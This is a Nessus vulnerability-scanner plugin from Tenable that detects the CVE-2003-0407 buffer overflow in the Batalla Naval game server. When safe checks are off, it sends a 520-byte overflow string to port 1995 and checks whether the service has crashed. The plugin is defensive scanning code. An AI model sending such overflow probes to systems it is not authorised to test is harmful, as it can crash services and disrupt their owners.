#
# (C) Tenable Network Security, Inc.
# 


include("compat.inc");


if(description)
{
 script_id(11651);
 script_version ("$Revision: 1.8 $");
 script_cve_id("CVE-2003-0407");
 script_xref(name:"OSVDB", value:"6553");
 
 script_name(english:"Batalla Naval gbnserver Remote Overflow");
 script_summary(english:"Checks if the remote Battala Server can be overflown");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "The game server running on the remote host has a buffer overflow\n",
     "vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote host is running Batalla Naval, a networked multiplayer\n",
     "battleship game.\n\n",
     "This version has a remote buffer overflow vulnerability.  A remote\n",
     "attacker could exploit this to crash the service, or possibly execute\n",
     "arbitrary code."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2003-05/0278.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Disable this service, or only allow trusted systems to connect."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
 );
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK);
 script_family(english:"Gain a shell remotely");

 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");

 script_require_ports("Services/gnome_batalla", 1995);
 script_dependencie("find_service2.nasl");

 exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/gnome_batalla");
if(!port)port = 1995;

if ( ! get_port_state(port) ) exit(0);

soc = open_sock_tcp(port);
if(!soc)exit(0);
send(socket:soc, data:string("HELP\r\n"));
r = recv_line(socket:soc, length:4096);
close(soc);

if("Gnome Batalla" >!< r)exit(0);

if(safe_checks())
{
  if(ereg(pattern:".*Server v(0\.|1\.0\.[0-4][^0-9]).*", string:r))
  {
    security_hole(port);
  }
  exit(0);
}

soc = open_sock_tcp(port);
if(!soc)exit(0); # WTF ?
poison = crap(520) + '\r\n';
send(socket:soc, data:poison);
r = recv_line(socket:soc, length:4096);
close(soc);

soc = open_sock_tcp(port);
if(!soc)security_hole(port);
send(socket:soc, data:'HELP\r\n');
r = recv_line(socket:soc, length:4096);
if(!r)security_hole(port);
